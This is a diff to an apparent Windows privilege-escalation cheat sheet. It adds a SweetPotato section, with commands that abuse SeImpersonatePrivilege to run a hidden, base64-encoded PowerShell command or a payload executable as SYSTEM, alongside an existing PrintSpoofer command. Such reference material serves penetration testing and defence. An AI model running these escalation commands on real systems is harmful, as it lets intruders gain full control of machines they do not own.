@@ -187,7 +187,16 @@ One way to gain system user on latest Operative System such as **Windows10 or Se
 ```
 PrintSpoofer64.exe -i -c cmd
 ```
+### SweetPotato
 
+`.NET` assembly to abuse `SeImpersonatePrivilege`.
+
+* [https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)
+
+```powershell
+SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <base64>"
+SweetPotato.exe -p C:\Temp\Payload.exe
+```
 ## SeLoadDriverPrivilege
 
 We are able to load a driver, so we can load a vulnerable driver, then exploit it.
